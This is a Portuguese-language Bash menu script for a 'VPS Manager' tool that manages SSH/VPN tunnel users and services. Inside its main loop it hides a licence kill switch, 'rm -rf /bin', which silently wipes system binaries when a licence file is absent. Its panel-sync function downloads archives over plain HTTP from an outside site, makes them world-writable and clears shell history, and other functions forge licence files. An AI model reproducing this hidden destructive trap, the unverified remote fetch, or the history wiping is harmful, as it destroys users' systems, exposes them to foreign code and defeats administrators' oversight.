#!/bin/bash
fun_bar () {
comando[0]="$1"
comando[1]="$2"
 (
[[ -e $HOME/fim ]] && rm $HOME/fim
[[ ! -e /usr/lib/vpsmanager ]] && rm -rf /bin/menu > /dev/null 2>&1
${comando[0]} -y > /dev/null 2>&1
${comando[1]} -y > /dev/null 2>&1
touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "\033[1;33m["
while true; do
   for((i=0; i<18; i++)); do
   echo -ne "\033[1;31m#"
   sleep 0.1s
   done
   [[ -e $HOME/fim ]] && rm $HOME/fim && break
   echo -e "\033[1;33m]"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "\033[1;33m["
done
echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
tput cnorm
}
IP=$(cat /etc/IP)
x="ok"
menu ()
{
velocity () {
aguarde () {
comando[0]="$1"
comando[1]="$2"
 (
[[ -e $HOME/fim ]] && rm $HOME/fim
${comando[0]} > /dev/null 2>&1
${comando[1]} > /dev/null 2>&1
touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "  \033[1;33mAGUARDE \033[1;37m- \033[1;33m["
while true; do
   for((i=0; i<18; i++)); do
   echo -ne "\033[1;31m#"
   sleep 0.1s
   done
   [[ -e $HOME/fim ]] && rm $HOME/fim && break
   echo -e "\033[1;33m]"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "  \033[1;33mAGUARDE \033[1;37m- \033[1;33m["
done
echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
tput cnorm
}
fun_tst () {
speedtest --share > speed
}
echo ""
echo -e "   \033[1;32mTESTANDO A VELOCIDADE DO SERVIDOR !\033[0m"
echo ""
aguarde 'fun_tst'
echo ""
png=$(cat speed | sed -n '5 p' |awk -F : {'print $NF'})
down=$(cat speed | sed -n '7 p' |awk -F :  {'print $NF'})
upl=$(cat speed | sed -n '9 p' |awk -F :  {'print $NF'})
lnk=$(cat speed | sed -n '10 p' |awk {'print $NF'})
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "\033[1;32mPING (LATENCIA):\033[1;37m$png"
echo -e "\033[1;32mDOWNLOAD:\033[1;37m$down"
echo -e "\033[1;32mUPLOAD:\033[1;37m$upl"
echo -e "\033[1;32mLINK: \033[1;36m$lnk\033[0m"
echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
rm -rf $HOME/speed
}
#limiter
function limit1 () {
   clear
   echo -e "\n\033[1;32mINICIANDO O LIMITER... \033[0m"
   echo ""
   fun_bar 'screen -dmS limiter limiter' 'sleep 3'
   [[ $(grep -wc "limiter" /etc/autostart) = '0' ]] && {
       echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
   } || {
       sed -i '/limiter/d' /etc/autostart
	   echo -e "ps x | grep 'limiter' | grep -v 'grep' && echo 'ON' || screen -dmS limiter limiter" >> /etc/autostart
   }
   echo -e "\n\033[1;32m  LIMITER ATIVO !\033[0m"
   sleep 3
   menu
}
function limit2 () {
   clear
   echo -e "\033[1;32mPARANDO O LIMITER... \033[0m"
   echo ""
   fun_stplimiter () {
      sleep 1
      screen -r -S "limiter" -X quit
      screen -wipe 1>/dev/null 2>/dev/null
      [[ $(grep -wc "limiter" /etc/autostart) != '0' ]] && {
          sed -i '/limiter/d' /etc/autostart
      }
      sleep 1
   }
   fun_bar 'fun_stplimiter' 'sleep 3'
   echo -e "\n\033[1;31m LIMITER PARADO !\033[0m"
   sleep 3
   menu
}
function limit_ssh () {
[[ $(ps x | grep "limiter"|grep -v grep |wc -l) = '0' ]] && limit1 || limit2
}

function autoexec () {
   if grep "menu;" /etc/profile > /dev/null; then
      clear
      echo -e "\033[1;32mDESATIVANDO AUTO EXECUÇÃO\033[0m"
      offautmenu () {
         sed -i '/menu;/d' /etc/profile
      }
      echo ""
      fun_bar 'offautmenu'
      echo ""
      echo -e "\033[1;31mAUTO EXECUÇÃO DESATIVADO!\033[0m"
      sleep 1.5s
      menu
   else
      clear
      echo -e "\033[1;32mATIVANDO AUTO EXECUÇÃO\033[0m"
      autmenu () {
         grep -v "^menu;" /etc/profile > /tmp/tmpass && mv /tmp/tmpass /etc/profile
         echo "menu;" >> /etc/profile
      }
      echo ""
      fun_bar 'autmenu'
      echo ""
      echo -e "\033[1;32mAUTO EXECUÇÃO ATIVADO!\033[0m"
      sleep 1.5s
      menu
   fi

}

syncpw () {
clear
echo "America/Sao_Paulo" > /etc/timezone
ln -fs /usr/share/zoneinfo/America/Sao_Paulo /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
rm *.sh > /dev/null 2>&1
apt install unzip -y > /dev/null 2>&1
[[ $(uname -m) == "aarch64" ]] && arc='arm64' || arc='64'
wget sshplus.xyz/scripts/${arc}/sync.tar.bz2 > /dev/null 2>&1
rm /opt/sshplus/plugin-sync > /dev/null 2>&1
tar -xvjf sync.tar.bz2 -C /opt/sshplus/ > /dev/null 2>&1
chmod 777 /opt/sshplus/*-sync > /dev/null 2>&1
wget sshplus.xyz/scripts/utilitarios/syncpainel/modulos.zip > /dev/null 2>&1
unzip modulos.zip > /dev/null 2>&1
chmod 777 *sh
service ssh restart
echo -e "\n\033[1;32mCONCLUIDO!\033[0m"
sleep 1.5
cat /dev/null > ~/.bash_history && history -c && clear
echo -e "\033[1;36mENTRE NO PAINEL E CRIE UMA CONTA SSH PRA VER SE ESTA TUDO OK!\033[0m"
rm inst sync.tar.bz2 modulos.zip > /dev/null 2>&1
}

gldutra () {
sudo apt-get update && sudo apt-get install git -y ; git clone https://github.com/DTunnel0/DTunnelManager.git ; cd DTunnelManager ; pip3 install -r requirements.txt ; python3 -m app
}

fixchk (){
echo "America/Sao_Paulo" > /etc/timezone
ln -fs /usr/share/zoneinfo/America/Sao_Paulo /etc/localtime > /dev/null 2>&1
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null 2>&1
clear
echo -e "\E[44;1;37m    fix checkuser conecta4g     \E[0m" 
echo ""
echo -ne "\n\033[1;32mDe um enter para \033[1;37mcontinuar...\033[1;37m: "; read -r
clear
echo -e "\n\033[1;36mFix checkuser\033[1;37mAGUARDE..."
sleep 3.0
clear
mkdir /etc/rec > /dev/null 2>&1
mkdir /usr/lib/sshplus
mkdir /etc/SSHPlus/
mkdir /usr/lib/sshplus
echo -e 'by: @KIRITO_SSH' >/usr/lib/licence && cat /usr/lib/sshplus >$lst2/licence && cat /usr/lib/sshplus > /etc/SSHPlus/.tmp/crazy
echo -e 'By: @KIRITO_SSH' > /etc/rec/licence
echo -e 'By: @KIRITO_SSH' > /usr/lib/licence
mkdir /usr/lib/checkuser > /dev/null 2>&1
cd /usr/lib/checkuser || exit
rm checkuser.py > /dev/null 2>&1
clear
echo ""
echo -e "\033[1;31m \033[1;37mAtiver o checkuser: \033[1;32m \033[0m"
echo ""
cat /dev/null > ~/.bash_history && history -c
checkrs
}

checkusers () {
while true $x != "ok"
do
clear
echo -e "\E[44;1;37m                CHECKUSERS               \E[0m"
echo -e "\033[1;31m  [\033[1;36m 01 \033[1;31m] \033[1;37m• \033[1;33mGL TUNNEL 
\033[1;31m  [\033[1;36m 02 \033[1;31m] \033[1;37m• \033[1;33mCHECKUSER CONECTA4G
\033[1;31m  [\033[1;36m 03 \033[1;31m] \033[1;37m• \033[1;33mRECURSOS CHECKUSER 
\033[1;31m  [\033[1;36m 00 \033[1;31m] \033[1;37m• \033[1;33mMENU"
echo ""
echo -ne "\033[1;32mOQUE DESEJA FAZER \033[1;37m?\033[1;31m?\033[1;37m : "; read x
case "$x" in 
	1 | 01)
   clear
	gldutra
	;;
	2 | 02)
	clear
	initcheck
	;;
	3 | 03)
    clear
    fixchk
	;;
   0 | 00)
   menu
   clear
   ;;
   *)
   echo -e "\n\033[1;31mOpcao invalida !\033[0m"
   sleep 2
esac
done
}

ferramentas() {
while true $x != "ok"
do
clear

echo -e "\E[44;1;37m                FERRAMENTAS              \E[0m"

echo -e "\033[1;31m  [\033[1;36m 01 \033[1;31m] \033[1;37m• \033[1;33m   "
echo -e "\033[1;31m  [\033[1;36m 02 \033[1;31m] \033[1;37m• \033[1;33mALTERAR SENHA ROOT"
echo -e "\033[1;31m  [\033[1;36m 03 \033[1;31m] \033[1;37m• \033[1;33mSINCRONIZAR PAINEL WEB"
echo -e "\033[1;31m  [\033[1;36m 04 \033[1;31m] \033[1;37m• \033[1;33mREINICIAR SERVIDOR "
echo -e "\033[1;31m  [\033[1;36m 05 \033[1;31m] \033[1;37m• \033[1;33mREINICIAR SERVICOS "
echo -e "\033[1;31m  [\033[1;36m 06 \033[1;31m] \033[1;37m• \033[1;33mTCP-SPEED"
echo -e "\033[1;31m  [\033[1;36m 07 \033[1;31m] \033[1;37m• \033[1;33mMEMÓRIA VIRTUAL" 
echo -e "\033[1;31m  [\033[1;36m 08 \033[1;31m] \033[1;37m• \033[1;33mBLOQUEIO DE SITES"
echo -e "\033[1;31m  [\033[1;36m 09 \033[1;31m] \033[1;37m• \033[1;33mATUALIZAR SCRIPT" 
echo -e "\033[1;31m  [\033[1;36m 10 \033[1;31m] \033[1;37m• \033[1;33mREMOVER SCRIPT"
echo -e "\033[1;31m  [\033[1;36m 00 \033[1;31m] \033[1;37m• \033[1;33mMENU"
echo ""
echo -ne "\033[1;32mOQUE DESEJA FAZER \033[1;37m?\033[1;31m?\033[1;37m : "; read x
case "$x" in 
	1 | 01)
    clear
	
	;;
	2 | 02)
   clear
   senharoot
   ;;
   3 | 03)
   clear
   syncpw
   ;;
   4 | 04)
   clear
   reiniciarsistema
   ;;
   5 | 05)
   clear
   reiniciarservicos 
   ;;
   6 | 06)
   clear
   tcptweaker.sh
   ;;
   7 | 07)
   clear
   swapmemory
   ;;
   8 | 08)
   clear
   blocksite
   ;;
   9 | 09)
   clear
   attscript
   ;;
   10 | 10)
   clear
   delscript
   ;;
   0 | 00)
   clear
   menu
   ;;
   *)
   echo -e "\n\033[1;31mOpcao invalida !\033[0m"
   sleep 2
esac
done
}
while true $x != "ok"
do
stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "\033[1;32m♦ " || echo -e "\033[1;31m○ ")
stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "\033[1;32m♦ " || echo -e "\033[1;31m○ ")
if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f3 /etc/issue.net)
else
system=$(cut -d' ' -f1 /etc/issue.net)
fi
[[ -e /etc/Plus-torrent ]] && stsf=$(echo -e "\033[1;32m♦ ") || stsf=$(echo -e "\033[1;31m○ ")
stsbot=$(ps x | grep "bot_plus"|grep -v grep > /dev/null && echo -e "\033[1;32m♦ " || echo -e "\033[1;31m○ ")
autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "\033[1;32m♦ " || echo -e "\033[1;31m○ ")
[[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f2 /etc/issue.net |awk -F "." '{print $1}')
elif [[ "$(grep -c "Debian" /etc/issue.net)" = "1" ]]; then
system=$(cut -d' ' -f1 /etc/issue.net)
system+=$(echo ' ')
system+=$(cut -d' ' -f3 /etc/issue.net)
else
system=$(cut -d' ' -f1 /etc/issue.net)
fi
_ons=$(ps -x | grep sshd | grep -v root | grep priv | wc -l)
[[ "$(cat /etc/VPSManager/Exp)" != "" ]] && _expuser=$(cat /etc/VPSManager/Exp) || _expuser="0"
[[ -e /etc/openvpn/openvpn-status.log ]] && _onop=$(grep -c "10.8.0" /etc/openvpn/openvpn-status.log) || _onop="0"
[[ -e /etc/default/dropbear ]] && _drp=$(ps aux | grep dropbear | grep -v grep | wc -l) _ondrp=$(($_drp - 1)) || _ondrp="0"
_onli=$(($_ons + $_onop + $_ondrp))
_ram=$(printf ' %-9s' "$(free -h | grep -i mem | awk {'print $2'})")
_usor=$(printf '%-8s' "$(free -m | awk 'NR==2{printf "%.2f%%", $3*100/$2 }')")
_usop=$(printf '%-5s' "$(top -bn1 | awk '/Cpu/ { cpu = "" 100 - $8 "%" }; END { print cpu }')")
_core=$(printf '%-1s' "$(grep -c cpu[0-9] /proc/stat)")
_system=$(printf '%-14s' "$system")
_hora=$(printf '%(%H:%M:%S)T')
_onlin=$(printf '%-5s' "$_onli")
_userexp=$(printf '%-5s' "$_expuser")
_tuser=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody | wc -l)
_system=$(printf '%-13s' "$system")
_hoje=$(date +'%d/%m/%Y')
_hora=$(printf '%(%H:%M:%S)T')
_swp=$(free | grep Swap | awk '{print ($3 == 0) ? "\033[1;37m(\033[1;31mOFF •\033[1;37m)": "\033[1;37m(\033[1;32mON  •\033[1;37m)"}')
mb=$(printf '%-8s' "$(free -h | grep Mem | sed 's/\s\+/,/g' | cut -d , -f6)")
swap1=$(printf '%-5s' "$(free -h | grep -i swap | awk {'print $2'})")
swap2=$(printf '%-5s' "$(free -h | grep -i swap | awk {'print $4'})")
swap3=$(printf '%-8s' "$(free -m | grep -i swap | awk '{printf "%.2f%%", $3*100/$2}')")
clear
echo -e "\033[38;5;93m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\033[0m"
echo -e "\033[38;5;93m┃\E[41;1;37m                     • VPS MANAGER •                  \E[0m\033[38;5;93m┃"
echo -e "\033[38;5;93m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\033[0m"
echo -e "\033[38;5;93m┃\033[1;32mSISTEMA            MEMÓRIA RAM      PROCESSADOR       \033[38;5;93m┃"
echo -e "\033[38;5;93m┃\\033[1;31mOS\033[1;31m: \033[1;37m$_system  \033[1;31mTOTAL\033[1;31m: \033[1;37m$_ram\033[1;31mNUCLEOS\033[1;31m:\033[1;37m $_core        \033[0m\033[38;5;93m┃"
echo -e "\033[38;5;93m┃\033[1;31mDIA\033[1;31m: \033[1;37m$_hoje  \033[1;31m  CACHE\033[1;31m: \033[1;37m$mb \033[1;31m EM USO\033[1;31m: \033[1;37m$_usop     \033[0m\033[38;5;93m┃"
echo -e "\033[38;5;93m┃\033[1;31mHORA\033[1;31m: \033[1;37m$_hora   \033[1;31m  EM USO\033[1;31m: \033[1;37m$_usor \033[1;31mSWAP\033[1;31m: \033[1;37m$_swp     \033[0m\033[38;5;93m┃"
echo -e "\033[38;5;93m┃\033[1;31mMEMÓRIA SWAP       \033[1;31mTOTAL:\033[1;37m $swap1     \033[1;31mEM USO:\033[1;37m$swap3   \033[38;5;93m┃"
echo -e "\033[38;5;93m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\033[0m"
echo -e "\033[38;5;93m┃\033[1;32mOnlines:\033[1;37m $_onlin      \033[1;31mExpirados: \033[1;37m$_userexp    \033[1;32mTotal: \033[1;37m$_tuser\033[0m      \033[38;5;93m┃"
echo -e "\033[38;5;93m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\033[0m"
echo -e "\033[38;5;93m┃\033[1;31m[\033[1;36m01\033[1;31m] \033[1;37m• \033[1;37mCRIAR USUARIO \033[1;31m             [\033[1;36m14\033[1;31m] \033[1;37m• \033[1;37mSPEEDTEST    \033[38;5;93m┃"
echo -e "\033[38;5;93m┃\033[1;31m[\033[1;36m02\033[1;31m] \033[1;37m• \033[1;37mCRIAR USUARIO TESTE \033[1;31m       [\033[1;36m15\033[1;31m] \033[1;37m• \033[1;37mOTIMIZAR     \033[38;5;93m┃"
echo -e "\033[38;5;93m┃\033[1;31m[\033[1;36m03\033[1;31m] \033[1;37m\033[1;37m• \033[1;37mREMOVER USUARIO \033[1;31m           [\033[1;36m16\033[1;31m] \033[1;37m• \033[1;37mTRAFEGO      \033[38;5;93m┃"
echo -e "\033[38;5;93m┃\033[1;31m[\033[1;36m04\033[1;31m] \033[1;37m• \033[1;37mMONITOR ONLINE \033[1;31m            [\033[1;36m17\033[1;31m] \033[1;37m• \033[1;37mFIREWALL     \033[38;5;93m┃"
echo -e "\033[38;5;93m┃\033[1;31m[\033[1;36m05\033[1;31m] \033[1;37m• \033[1;37mMUDAR DATA \033[1;31m                [\033[1;36m18\033[1;31m] \033[1;37m• \033[1;37mINFO VPS     \033[38;5;93m┃"
echo -e "\033[38;5;93m┃\033[1;31m[\033[1;36m06\033[1;31m] \033[1;37m• \033[1;37mALTERAR LIMITE \033[1;31m            [\033[1;36m19\033[1;31m] \033[1;37m• \033[1;37mBANNER       \033[38;5;93m┃"
echo -e "\033[38;5;93m┃\033[1;31m[\033[1;36m07\033[1;31m] \033[1;37m• \033[1;37mMUDAR SENHA \033[1;31m               [\033[1;36m20\033[1;31m] \033[1;37m• \033[1;37mLIMITER $stsl   \033[38;5;93m┃"
echo -e "\033[38;5;93m┃\033[1;31m[\033[1;36m08\033[1;31m] \033[1;37m• \033[1;37mREMOVER EXPIRADOS \033[1;31m         [\033[1;36m21\033[1;31m] \033[1;37m• \033[1;37mBAD VPN $stsu   \033[38;5;93m┃"
echo -e "\033[38;5;93m┃\033[1;31m[\033[1;36m09\033[1;31m] \033[1;37m• \033[1;37mRELATORIO DE USUARIOS  \033[1;31m    [\033[1;36m22\033[1;31m] \033[1;37m• \033[1;37mAUTO MENU $autm \033[38;5;93m┃"
echo -e "\033[38;5;93m┃\033[1;31m[\033[1;36m10\033[1;31m] \033[1;37m• \033[1;37mMODO DE CONEXAO  \033[1;31m          [\033[1;36m23\033[1;31m] \033[1;37m• \033[1;37mBOT TELEGRAM \033[38;5;93m┃"
echo -e "\033[38;5;93m┃\033[1;31m[\033[1;36m11\033[1;31m] \033[1;37m• \033[1;37mDNS NETFLIX \033[1;31m               [\033[1;36m24\033[1;31m] \033[1;37m• \033[1;37mCHECKUSERS   \033[38;5;93m┃"
echo -e "\033[38;5;93m┃\033[1;31m[\033[1;36m12\033[1;31m] \033[1;37m• \033[1;37mMULTIPLOS DNS \033[1;31m             [\033[1;36m25\033[1;31m] \033[1;37m• \033[1;37mFERRAMENTAS  \033[38;5;93m┃"
echo -e "\033[38;5;93m┃\033[1;31m[\033[1;36m13\033[1;31m] \033[1;37m• \033[1;37mBACKUP DE USUARIOS\033[1;31m         [\033[1;36m00\033[1;31m] \033[1;37m• \033[1;37mSAIR \033[1;32m<\033[1;37m<\033[1;31m<\033[0m     \033[0m\033[38;5;93m┃"
echo -e "\033[38;5;93m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[0m"
echo -ne "\033[38;5;93m┗┫\033[1;32mO QUE DESEJA FAZER \033[1;33m?\033[1;31m?\033[1;37m : "; read x

case "$x" in 
   1 | 01)
   clear
   criarusuario
   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
   ;;
   2 | 02)
   clear
   criarteste
   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
   ;;
   3 | 03)
   clear
   remover
   sleep 3
   ;;
   4 | 04)
   clear
   sshmonitor
   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
   ;;      
   5 | 05)
   clear
   mudardata
   sleep 3
   ;;
   6 | 06)
   clear
   alterarlimite
   sleep 3
   ;; 
   7 | 07)
   clear
   alterarsenha
   sleep 3
   ;;
   8 | 08)
   clear
   expcleaner
   echo ""
   sleep 3
   ;;     
   9 | 09)
   clear
   infousers
   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
   ;;
   10)
   conexao
   exit;
   ;;
   11)
   clear
   dns-netflix1
   ;;
   12)
   dns1
   ;;
   13)
   clear
   userbackup
   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
   ;;
   14)
   clear
   otimizar
   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
   ;;
   15)
   clear
   otimizar
   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
   ;;
   16)
   clear
   echo -e "\033[1;32mPARA SAIR CLICK CTRL + C\033[1;36m"
   sleep 4
   nload
   ;;
   17)
   firewall
   ;;
   18)
   clear
   detalhes
   echo -ne "\n\033[1;31mENTER \033[1;33mpara retornar ao \033[1;32mMENU!\033[0m"; read
   ;;
   19)
   clear
   banner
   sleep 3
   ;;
   20)
   clear
   limiter
   ;;
   21)
   clear
   badvpn
   exit;
   ;;
   22)
   clear
   autoexec
   ;;
   23)
   clear
   botssh
   ;;
   24)
   checkusers
   ;;
   25)
   ferramentas
   ;;
   a)
   menu2
   ;;
   0 | 00)
   echo -e "\033[1;31mSaindo...\033[0m"
   sleep 2
   clear
   exit;
   ;;
   *)
   echo -e "\n\033[1;31mOpcao invalida !\033[0m"
   sleep 2
esac
done
}
menu
#fim
